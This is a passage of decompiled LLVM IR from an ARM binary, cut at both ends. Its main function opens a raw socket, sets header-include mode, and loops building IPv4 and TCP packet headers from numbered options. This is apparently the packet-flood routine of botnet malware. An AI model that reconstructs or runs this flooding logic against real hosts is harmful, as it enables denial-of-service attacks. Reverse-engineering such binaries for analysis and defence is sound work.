  uselistorder i32 %v3_a3f8, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_a384, { 1, 0 }
  uselistorder i32 %v6_a37c, { 0, 2, 1, 3 }
  uselistorder i1 %v9_a3ac, { 1, 0 }
  uselistorder i32 %v4_a3c0, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_a308, { 1, 0, 2 }
  uselistorder i32 %v0_a4b8, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_a2f8, { 1, 0 }
  uselistorder i1 %v7_a2f0, { 1, 0, 2 }
  uselistorder i1 %v7_a2a4, { 1, 0 }
  uselistorder i32 %v3_a2a0, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_a680, { 1, 0 }
  uselistorder i32 %v1_a668, { 1, 0 }
  uselistorder i32 %v1_a650, { 1, 0 }
  uselistorder i32 %v1_a638, { 1, 0 }
  uselistorder i32 %v1_a620, { 1, 0 }
  uselistorder i32 %v3_a3b8, { 1, 0 }
  uselistorder i1 %v2_a3d4, { 1, 0 }
  uselistorder i32 %v1_a3d0, { 1, 0 }
  uselistorder i32 %v4_a3cc, { 2, 0, 1 }
  uselistorder i32 %v2_a2e0, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_a27c, { 1, 0 }
  uselistorder i1 %v7_a274, { 1, 0 }
  uselistorder i1 %v7_a248, { 1, 0 }
  uselistorder i32 %v3_a244, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_a230, { 2, 3, 1, 0 }
  uselistorder i32 %v6_a210, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_a1f8, { 1, 2, 0 }
  uselistorder i32 %v1_a1d8, { 1, 2, 0 }
  uselistorder i32 %v1_a1b8, { 1, 2, 0 }
  uselistorder i32 %v1_a198, { 1, 2, 0 }
  uselistorder i32 %v1_a178, { 1, 2, 0 }
  uselistorder i32 %v1_a158, { 1, 2, 0 }
  uselistorder i32 %v6_a134, { 1, 0 }
  uselistorder i32 %v1_a11c, { 1, 2, 0 }
  uselistorder i32 %v6_a0b4, { 2, 1, 3, 0 }
  uselistorder i32 %v2_a09c, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v2_a08c, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 45, 47, 49, 48, 50, 52, 51, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 6, 9, 8, 11, 10, 16, 12, 13, 14, 15, 19, 17, 18, 21, 20, 22, 25, 24, 23, 26, 27, 28, 30, 31, 29, 32, 34, 33, 35, 36, 37, 39, 38, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 32, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a718, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a6ec, { 1, 0 }
  uselistorder label %dec_label_pc_a6dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a6cc, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %dec_label_pc_a438, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a408, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a344, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_a324, { 1, 0 }
  uselistorder label %dec_label_pc_a300, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_a2b0, { 1, 0 }
  uselistorder label %dec_label_pc_a294, { 1, 0 }
}

define i32 @function_a824(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a824:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_a824 = load i32, i32* @sb, align 4
  %v24_a824 = load i32, i32* @fp, align 4
  %v27_a824 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_a840 = call i32 @function_1214c(i32 %arg1, i32 4)
  %v0_a844 = load i32, i32* @r5, align 4
  store i32 %v0_a844, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a854 = load i32, i32* @r4, align 4
  store i32 %v0_a854, i32* %r0.global-to-local, align 4
  %v5_a858 = inttoptr i32 %v0_a844 to i32*
  %v6_a858 = call i32 @function_8570(i32 %v0_a854, i32* %v5_a858, i32 2, i32 0, i32 %v2_a840)
  %v1_a864 = urem i32 %v6_a858, 256
  store i32 %v1_a864, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a870 = load i32, i32* @r5, align 4
  store i32 %v0_a870, i32* %r1.global-to-local, align 4
  %v0_a874 = load i32, i32* @r4, align 4
  store i32 %v0_a874, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v6_a858, 16777216
  %v5_a87c = sdiv i32 %sext, 16777216
  %v6_a87c = inttoptr i32 %v0_a870 to i32*
  %v7_a87c = call i32 @function_8570(i32 %v0_a874, i32* %v6_a87c, i32 3, i32 65535, i32 %v5_a87c)
  %v0_a880 = load i32, i32* @r5, align 4
  store i32 %v0_a880, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a87c, i32* %sb.global-to-local, align 4
  %v0_a890 = load i32, i32* @r4, align 4
  store i32 %v0_a890, i32* %r0.global-to-local, align 4
  %v5_a894 = inttoptr i32 %v0_a880 to i32*
  %v6_a894 = call i32 @function_8570(i32 %v0_a890, i32* %v5_a894, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_a89c = urem i32 %v6_a894, 256
  store i32 %v1_a89c, i32* %ip.global-to-local, align 4
  %v0_a8a0 = load i32, i32* @r5, align 4
  store i32 %v0_a8a0, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a8ac = load i32, i32* @r4, align 4
  store i32 %v0_a8ac, i32* %r0.global-to-local, align 4
  %sext4 = mul i32 %v6_a894, 16777216
  %v5_a8b4 = sdiv i32 %sext4, 16777216
  %v6_a8b4 = inttoptr i32 %v0_a8a0 to i32*
  %v7_a8b4 = call i32 @function_8570(i32 %v0_a8ac, i32* %v6_a8b4, i32 5, i32 0, i32 %v5_a8b4)
  %v1_a8c0 = urem i32 %v7_a8b4, 256
  store i32 %v1_a8c0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a8cc = load i32, i32* @r5, align 4
  store i32 %v0_a8cc, i32* %r1.global-to-local, align 4
  %v0_a8d0 = load i32, i32* @r4, align 4
  store i32 %v0_a8d0, i32* %r0.global-to-local, align 4
  %v5_a8d8 = inttoptr i32 %v0_a8cc to i32*
  %v6_a8d8 = call i32 @function_8570(i32 %v0_a8d0, i32* %v5_a8d8, i32 6, i32 65535, i32 %v1_a8c0)
  %v0_a8e0 = load i32, i32* @r5, align 4
  store i32 %v0_a8e0, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_a8d8, i32* @r6, align 4
  %v0_a8f0 = load i32, i32* @r4, align 4
  store i32 %v0_a8f0, i32* %r0.global-to-local, align 4
  %v5_a8f4 = inttoptr i32 %v0_a8e0 to i32*
  %v6_a8f4 = call i32 @function_8570(i32 %v0_a8f0, i32* %v5_a8f4, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_a8fc = load i32, i32* @r5, align 4
  store i32 %v0_a8fc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v6_a8f4, i32* @sl, align 4
  %v0_a90c = load i32, i32* @r4, align 4
  store i32 %v0_a90c, i32* %r0.global-to-local, align 4
  %v5_a910 = inttoptr i32 %v0_a8fc to i32*
  %v6_a910 = call i32 @function_8570(i32 %v0_a90c, i32* %v5_a910, i32 17, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_a91c = load i32, i32* @r5, align 4
  store i32 %v0_a91c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_a928 = load i32, i32* @r4, align 4
  store i32 %v0_a928, i32* %r0.global-to-local, align 4
  %v5_a92c = inttoptr i32 %v0_a91c to i32*
  %v6_a92c = call i32 @function_8570(i32 %v0_a928, i32* %v5_a92c, i32 18, i32 65535, i32 %v6_a910)
  %v0_a930 = load i32, i32* @r5, align 4
  store i32 %v0_a930, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a940 = load i32, i32* @r4, align 4
  store i32 %v0_a940, i32* %r0.global-to-local, align 4
  %v5_a944 = inttoptr i32 %v0_a930 to i32*
  %v6_a944 = call i32 @function_8570(i32 %v0_a940, i32* %v5_a944, i32 11, i32 0, i32 %v6_a92c)
  %v0_a948 = load i32, i32* @r5, align 4
  store i32 %v0_a948, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a958 = load i32, i32* @r4, align 4
  store i32 %v0_a958, i32* %r0.global-to-local, align 4
  %v5_a95c = inttoptr i32 %v0_a948 to i32*
  %v6_a95c = call i32 @function_8570(i32 %v0_a958, i32* %v5_a95c, i32 12, i32 1, i32 %v6_a944)
  %v0_a960 = load i32, i32* @r5, align 4
  store i32 %v0_a960, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a970 = load i32, i32* @r4, align 4
  store i32 %v0_a970, i32* %r0.global-to-local, align 4
  %v5_a974 = inttoptr i32 %v0_a960 to i32*
  %v6_a974 = call i32 @function_8570(i32 %v0_a970, i32* %v5_a974, i32 13, i32 0, i32 %v6_a95c)
  %v0_a978 = load i32, i32* @r5, align 4
  store i32 %v0_a978, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a988 = load i32, i32* @r4, align 4
  store i32 %v0_a988, i32* %r0.global-to-local, align 4
  %v5_a98c = inttoptr i32 %v0_a978 to i32*
  %v6_a98c = call i32 @function_8570(i32 %v0_a988, i32* %v5_a98c, i32 14, i32 0, i32 %v6_a974)
  %v0_a990 = load i32, i32* @r5, align 4
  store i32 %v0_a990, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9a0 = load i32, i32* @r4, align 4
  store i32 %v0_a9a0, i32* %r0.global-to-local, align 4
  %v5_a9a4 = inttoptr i32 %v0_a990 to i32*
  %v6_a9a4 = call i32 @function_8570(i32 %v0_a9a0, i32* %v5_a9a4, i32 15, i32 0, i32 %v6_a98c)
  %v0_a9a8 = load i32, i32* @r5, align 4
  store i32 %v0_a9a8, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9b8 = load i32, i32* @r4, align 4
  store i32 %v0_a9b8, i32* %r0.global-to-local, align 4
  %v5_a9bc = inttoptr i32 %v0_a9a8 to i32*
  %v6_a9bc = call i32 @function_8570(i32 %v0_a9b8, i32* %v5_a9bc, i32 16, i32 0, i32 %v6_a9a4)
  %v0_a9c0 = load i32, i32* @r5, align 4
  store i32 %v0_a9c0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_a9d0 = load i32, i32* @r4, align 4
  store i32 %v0_a9d0, i32* %r0.global-to-local, align 4
  %v5_a9d4 = inttoptr i32 %v0_a9c0 to i32*
  %v6_a9d4 = call i32 @function_8570(i32 %v0_a9d0, i32* %v5_a9d4, i32 0, i32 512, i32 %v6_a9bc)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a9e4 = load i32, i32* @r5, align 4
  store i32 %v0_a9e4, i32* %r1.global-to-local, align 4
  %v0_a9e8 = load i32, i32* @r4, align 4
  store i32 %v0_a9e8, i32* %r0.global-to-local, align 4
  %v5_a9ec = inttoptr i32 %v0_a9e4 to i32*
  %v6_a9ec = call i32 @function_8570(i32 %v0_a9e8, i32* %v5_a9ec, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v2_a9f8 = load i32, i32* @global_var_20a4c.46, align 4
  store i32 %v2_a9f8, i32* %r3.global-to-local, align 4
  %v1_a9fc = urem i32 %v6_a9ec, 256
  store i32 %v1_a9fc, i32* %ip.global-to-local, align 4
  %v0_aa00 = load i32, i32* @r5, align 4
  store i32 %v0_aa00, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_aa08 = load i32, i32* @r4, align 4
  store i32 %v0_aa08, i32* %r0.global-to-local, align 4
  %v5_aa10 = inttoptr i32 %v0_aa00 to i32*
  %v6_aa10 = call i32 @function_8504(i32 %v0_aa08, i32* %v5_aa10, i32 25, i32 %v2_a9f8, i32 %v1_a9fc)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_aa24 = call i32 @function_115e4(i32 2, i32 3, i32 6)
  store i32 %v3_aa24, i32* %r0.global-to-local, align 4
  %v7_aa28 = icmp eq i32 %v3_aa24, -1
  store i1 %v7_aa28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aa28, label %dec_label_pc_aef0, label %dec_label_pc_aa34

dec_label_pc_aa34:                                ; preds = %dec_label_pc_a824
  store i32 1, i32* %stack_var_-44, align 4
  %v6_aa3c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_aa3c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_aa50 = call i32 @function_115a0(i32 %v3_aa24, i32 0, i32 3, i32 %v6_aa3c, i32 4)
  store i32 %v5_aa50, i32* %r0.global-to-local, align 4
  %v7_aa54 = icmp eq i32 %v5_aa50, -1
  store i1 %v7_aa54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aa54, label %dec_label_pc_aee8, label %dec_label_pc_aa5c

dec_label_pc_aa5c:                                ; preds = %dec_label_pc_aa34
  %v0_aa5c = load i32, i32* %sb.global-to-local, align 4
  %v3_aa5c = mul i32 %v0_aa5c, 65536
  store i32 %v3_aa5c, i32* @r5, align 4
  %v0_aa60 = load i32, i32* @r6, align 4
  %v0_aa64 = load i32, i32* @sl, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_aa6c = urem i32 %v0_aa5c, 65536
  store i32 %v3_aa6c, i32* %r1.global-to-local, align 4
  %v3_aa70 = urem i32 %v0_aa60, 65536
  store i32 %v3_aa70, i32* %r2.global-to-local, align 4
  %v3_aa74 = urem i32 %v0_aa64, 65536
  store i32 %v3_aa74, i32* %r3.global-to-local, align 4
  %v0_aa78 = load i32, i32* @r7, align 4
  %v2_aa78 = icmp eq i32 %v0_aa78, 0
  store i1 %v2_aa78, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_aa78, label %dec_label_pc_aefc, label %dec_label_pc_aa90

dec_label_pc_aa90:                                ; preds = %dec_label_pc_aa5c
  %v3_aa94 = mul i32 %v6_a9d4, 65536
  %v1_aa98 = add i32 %v3_aa94, 2621440
  store i32 %v1_aa98, i32* @lr, align 4
  %tmp59 = mul i32 %v0_aa60, 256
  %v3_aabc = and i32 %tmp59, 65280
  %tmp60 = mul i32 %v0_aa64, 256
  %v3_aac0 = and i32 %tmp60, 65280
  %tmp61 = udiv i32 %v0_aa60, 256
  %v4_aac4 = urem i32 %tmp61, 256
  %v5_aac4 = or i32 %v4_aac4, %v3_aabc
  store i32 %v5_aac4, i32* @r6, align 4
  %tmp62 = udiv i32 %v0_aa64, 256
  %v4_aac8 = urem i32 %tmp62, 256
  %v5_aac8 = or i32 %v4_aac8, %v3_aac0
  store i32 %v5_aac8, i32* @sl, align 4
  %tmp63 = udiv i32 %v1_aa98, 256
  %v3_aadc = and i32 %tmp63, 65280
  %tmp64 = mul i32 %v0_aa5c, 256
  %v3_aae0 = and i32 %tmp64, 65280
  %tmp65 = mul i32 %v6_a910, 256
  %v3_aae4 = and i32 %tmp65, 65280
  %v1_aae8 = urem i32 %v6_a944, 2
  %v1_aaec = urem i32 %v6_a95c, 2
  %tmp66 = udiv i32 %v6_a910, 256
  %v4_aaf0 = urem i32 %tmp66, 256
  %v5_aaf0 = or i32 %v4_aaf0, %v3_aae4
  %v4_aaf4 = udiv i32 %v1_aa98, 16777216
  %v5_aaf4 = or i32 %v3_aadc, %v4_aaf4
  store i32 %v5_aaf4, i32* @sb, align 4
  %tmp67 = udiv i32 %v0_aa5c, 256
  %v4_aaf8 = urem i32 %tmp67, 256
  %v5_aaf8 = or i32 %v4_aaf8, %v3_aae0
  store i32 %v5_aaf8, i32* @fp, align 4
  %v1_ab14 = urem i32 %v6_a974, 2
  store i32 %v1_ab14, i32* %r2.global-to-local, align 4
  %v1_ab18 = urem i32 %v6_a98c, 2
  store i32 %v1_ab18, i32* %r3.global-to-local, align 4
  %v1_ab1c = urem i32 %v6_a9a4, 2
  store i32 %v1_ab1c, i32* %ip.global-to-local, align 4
  %v1_ab20 = urem i32 %v6_a9bc, 2
  store i32 %v1_ab20, i32* %r0.global-to-local, align 4
  %v1_ab24 = urem i32 %v6_a974, 256
  store i32 %v1_ab24, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %tmp = sub nsw i32 0, %v1_aaec
  %v4_ac10 = and i32 %tmp, 16
  %tmp72 = sub nsw i32 0, %v1_ab14
  %v4_ac2c = and i32 %tmp72, 8
  %tmp73 = sub nsw i32 0, %v1_ab18
  %v4_ac40 = and i32 %tmp73, 4
  %tmp74 = sub nsw i32 0, %v1_ab1c
  %v3_ac54 = and i32 %tmp74, 2
  %v2_ac78 = icmp eq i32 %v1_ab24, 0
  %v1_aba0 = trunc i32 %v5_a87c to i8
  %extract.t = trunc i32 %v5_a8b4 to i8
  br label %dec_label_pc_ab44

dec_label_pc_ab44:                                ; preds = %bb70, %dec_label_pc_aa90
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_ab50 = call i32 @function_1214c(i32 1510, i32 1)
  store i32 %v2_ab50, i32* %r0.global-to-local, align 4
  %v2_ab58 = load i32, i32* @r4, align 4
  %v5_ab58 = mul i32 %v2_ab58, 4
  %v6_ab58 = add i32 %v5_ab58, %v2_a840
  %v7_ab58 = inttoptr i32 %v6_ab58 to i32*
  store i32 %v2_ab50, i32* %v7_ab58, align 4
  %v3_ab5c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ab5c, i32* %r2.global-to-local, align 4
  %v5_ab64 = mul i32 %v3_ab5c, 24
  %v1_ab68 = load i32, i32* @r8, align 4
  %v2_ab68 = add i32 %v1_ab68, %v5_ab64
  store i32 %v2_ab68, i32* %r1.global-to-local, align 4
  store i32 %v2_a840, i32* %r3.global-to-local, align 4
  %v4_ab70 = mul i32 %v3_ab5c, 4
  %v5_ab70 = add i32 %v4_ab70, %v2_a840
  %v6_ab70 = inttoptr i32 %v5_ab70 to i32*
  %v7_ab70 = load i32, i32* %v6_ab70, align 4
  store i32 %v7_ab70, i32* @r5, align 4
  %v1_ab74 = inttoptr i32 %v7_ab70 to i8*
  %v2_ab74 = load i8, i8* %v1_ab74, align 1
  %tmp75 = urem i8 %v2_ab74, 16
  %v1_ab78 = zext i8 %tmp75 to i32
  %v1_ab7c = or i32 %v1_ab78, 64
  store i32 %v1_ab7c, i32* %r3.global-to-local, align 4
  %v1_ab80 = trunc i32 %v1_ab7c to i8
  store i8 %v1_ab80, i8* %v1_ab74, align 1
  %v0_ab84 = load i32, i32* @r5, align 4
  %v1_ab84 = inttoptr i32 %v0_ab84 to i8*
  %v2_ab84 = load i8, i8* %v1_ab84, align 1
  %v1_ab88 = and i8 %v2_ab84, -16
  %v1_ab8c = or i8 %v1_ab88, 5
  store i32 %v1_a8c0, i32* %ip.global-to-local, align 4
  store i8 %v1_ab8c, i8* %v1_ab84, align 1
  store i32 %v5_a87c, i32* %r0.global-to-local, align 4
  %v0_ab9c = load i32, i32* %ip.global-to-local, align 4
  %v2_ab9c = icmp eq i32 %v0_ab9c, 0
  store i1 %v2_ab9c, i1* %cpsr_z.global-to-local, align 1
  %v2_aba0 = load i32, i32* @r5, align 4
  %v3_aba0 = add i32 %v2_aba0, 1
  %v4_aba0 = inttoptr i32 %v3_aba0 to i8*
  store i8 %v1_aba0, i8* %v4_aba0, align 1
  store i32 %v5_a8b4, i32* %r2.global-to-local, align 4
  %v0_aba8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_aba8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_ab44
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_abac = load i32, i32* @r5, align 4
  %v4_abac = add i32 %v3_abac, 6
  %v5_abac = inttoptr i32 %v4_abac to i16*
  store i16 64, i16* %v5_abac, align 2
  %v0_abb4.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t17 = trunc i32 %v0_abb4.pre to i8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_ab44, %bb
  %v0_abb4.off0 = phi i8 [ %extract.t, %dec_label_pc_ab44 ], [ %extract.t17, %bb ]
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_abb4 = load i32, i32* @r5, align 4
  %v3_abb4 = add i32 %v2_abb4, 8
  %v4_abb4 = inttoptr i32 %v3_abb4 to i8*
  store i8 %v0_abb4.off0, i8* %v4_abb4, align 1
  %v0_abb8 = load i32, i32* %r3.global-to-local, align 4
  %v1_abb8 = trunc i32 %v0_abb8 to i8
  %v2_abb8 = load i32, i32* @r5, align 4
  %v3_abb8 = add i32 %v2_abb8, 9
  %v4_abb8 = inttoptr i32 %v3_abb8 to i8*
  store i8 %v1_abb8, i8* %v4_abb8, align 1
  store i32 %v6_aa10, i32* %ip.global-to-local, align 4
  %v1_abc0 = load i32, i32* @r5, align 4
  %v2_abc0 = add i32 %v1_abc0, 12
  %v3_abc0 = inttoptr i32 %v2_abc0 to i32*
  store i32 %v6_aa10, i32* %v3_abc0, align 4
  %v0_abc4 = load i32, i32* %r1.global-to-local, align 4
  %v1_abc4 = add i32 %v0_abc4, 16
  %v2_abc4 = inttoptr i32 %v1_abc4 to i32*
  %v3_abc4 = load i32, i32* %v2_abc4, align 4
  store i32 %v3_abc4, i32* %r3.global-to-local, align 4
  %v0_abc8 = load i32, i32* @sb, align 4
  %v1_abc8 = trunc i32 %v0_abc8 to i16
  %v2_abc8 = load i32, i32* @r5, align 4
  %v3_abc8 = add i32 %v2_abc8, 2
  %v4_abc8 = inttoptr i32 %v3_abc8 to i16*
  store i16 %v1_abc8, i16* %v4_abc8, align 2
  %v0_abcc = load i32, i32* @fp, align 4
  %v1_abcc = trunc i32 %v0_abcc to i16
  %v2_abcc = load i32, i32* @r5, align 4
  %v3_abcc = add i32 %v2_abcc, 4
  %v4_abcc = inttoptr i32 %v3_abcc to i16*
  store i16 %v1_abcc, i16* %v4_abcc, align 2
  %v0_abd0 = load i32, i32* %r3.global-to-local, align 4
  %v1_abd0 = load i32, i32* @r5, align 4
  %v2_abd0 = add i32 %v1_abd0, 16
  %v3_abd0 = inttoptr i32 %v2_abd0 to i32*
  store i32 %v0_abd0, i32* %v3_abd0, align 4
  %v0_abd4 = load i32, i32* @r6, align 4
  %v1_abd4 = trunc i32 %v0_abd4 to i16
  %v2_abd4 = load i32, i32* @r5, align 4
  %v3_abd4 = add i32 %v2_abd4, 20
  %v4_abd4 = inttoptr i32 %v3_abd4 to i16*
  store i16 %v1_abd4, i16* %v4_abd4, align 2
  %v0_abd8 = load i32, i32* @r5, align 4
  %v1_abd8 = add i32 %v0_abd8, 20
  store i32 %v1_abd8, i32* @r4, align 4
  %v1_abdc = add i32 %v0_abd8, 32
  %v2_abdc = inttoptr i32 %v1_abdc to i8*
  %v3_abdc = load i8, i8* %v2_abdc, align 1
  %v4_abdc = zext i8 %v3_abdc to i32
  store i32 %v4_abdc, i32* %r3.global-to-local, align 4
  %v1_abe0 = add i32 %v0_abd8, 33
  %v2_abe0 = inttoptr i32 %v1_abe0 to i8*
  %v3_abe0 = load i8, i8* %v2_abe0, align 1
  %v4_abe0 = zext i8 %v3_abe0 to i32
  store i32 %v1_aae8, i32* %r0.global-to-local, align 4
  %tmp76 = urem i8 %v3_abdc, 16
  %v1_abe8 = zext i8 %tmp76 to i32
  %v1_abec = or i32 %v1_abe8, 80
  store i32 %v1_abec, i32* %r3.global-to-local, align 4
  %v1_abf0 = and i32 %v4_abe0, 223
  store i32 %v1_abf0, i32* %r2.global-to-local, align 4
  %v1_abf4 = trunc i32 %v1_abec to i8
  store i8 %v1_abf4, i8* %v2_abdc, align 1
  %v0_abf8 = load i32, i32* %r2.global-to-local, align 4
  %v1_abf8 = load i32, i32* %r0.global-to-local, align 4
  %v4_abf8 = mul i32 %v1_abf8, 32
  %v5_abf8 = or i32 %v4_abf8, %v0_abf8
  store i32 %v5_abf8, i32* %r2.global-to-local, align 4
  store i32 %v5_aaf0, i32* %r1.global-to-local, align 4
  %v1_ac00 = trunc i32 %v5_abf8 to i8
  %v2_ac00 = load i32, i32* @r4, align 4
  %v3_ac00 = add i32 %v2_ac00, 13
  %v4_ac00 = inttoptr i32 %v3_ac00 to i8*
  store i8 %v1_ac00, i8* %v4_ac00, align 1
  %v0_ac04 = load i32, i32* @r4, align 4
  %v1_ac04 = add i32 %v0_ac04, 13
  %v2_ac04 = inttoptr i32 %v1_ac04 to i8*
  %v3_ac04 = load i8, i8* %v2_ac04, align 1
  %v4_ac04 = zext i8 %v3_ac04 to i32
  store i32 %v1_aaec, i32* %r2.global-to-local, align 4
  %v1_ac0c = and i32 %v4_ac04, 239
  %v5_ac10 = or i32 %v1_ac0c, %v4_ac10
  store i32 %v5_ac10, i32* %r3.global-to-local, align 4
  %v0_ac14 = load i32, i32* %r1.global-to-local, align 4
  %v2_ac14 = add i32 %v0_ac04, 4
  %v3_ac14 = inttoptr i32 %v2_ac14 to i32*
  store i32 %v0_ac14, i32* %v3_ac14, align 4
  %v0_ac18 = load i32, i32* @sl, align 4
  %v1_ac18 = trunc i32 %v0_ac18 to i16
  %v2_ac18 = load i32, i32* @r4, align 4
  %v3_ac18 = add i32 %v2_ac18, 2
